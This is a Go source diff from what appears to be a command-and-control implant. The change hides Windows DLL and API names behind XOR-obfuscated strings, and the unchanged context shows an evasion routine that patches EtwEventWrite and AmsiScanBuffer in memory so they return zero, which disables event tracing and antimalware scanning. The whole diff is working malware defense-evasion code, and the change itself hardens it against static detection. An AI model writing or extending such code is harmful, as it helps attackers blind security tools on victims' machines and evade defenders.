@@ -45,12 +45,12 @@ type evModEntry32W struct {
 }
 
 var (
-	evK32     = syscall.NewLazyDLL("kernel32.dll")
-	evSnap    = evK32.NewProc("CreateToolhelp32Snapshot")
-	evM32F    = evK32.NewProc("Module32FirstW")
-	evM32N    = evK32.NewProc("Module32NextW")
-	evClose   = evK32.NewProc("CloseHandle")
-	evVProtect = evK32.NewProc("VirtualProtect")
+	evK32      = syscall.NewLazyDLL(xob(eEvKernel32))
+	evSnap     = evK32.NewProc(xob(eEvToolhelpSnap))
+	evM32F     = evK32.NewProc(xob(eEvModuleFirst))
+	evM32N     = evK32.NewProc(xob(eEvModuleNext))
+	evClose    = evK32.NewProc(xob(eEvCloseHandle))
+	evVProtect = evK32.NewProc(xob(eEvVirtualProtect))
 )
 
 func evHashBytes(b []byte) uint32 {
@@ -156,12 +156,12 @@ func evasionInit() {
 	if os.Getenv(xob(eC2Evasion)) == "0" {
 		return
 	}
-	if ntd := evModBase("ntdll.dll"); ntd != 0 {
+	if ntd := evModBase(xob(eEvNtdll)); ntd != 0 {
 		if a, err := evResolveExport(ntd, hEtwEventWrite); err == nil {
 			_ = evPatchReturnZero(a, []byte{0x33, 0xC0, 0xC3}) // xor eax,eax; ret
 		}
 	}
-	if amsi := evModBase("amsi.dll"); amsi != 0 {
+	if amsi := evModBase(xob(eEvAmsi)); amsi != 0 {
 		if a, err := evResolveExport(amsi, hAmsiScanBuffer); err == nil {
 			_ = evPatchReturnZero(a, []byte{0x33, 0xC0, 0xC3}) // AMSI_RESULT_CLEAN
 		}
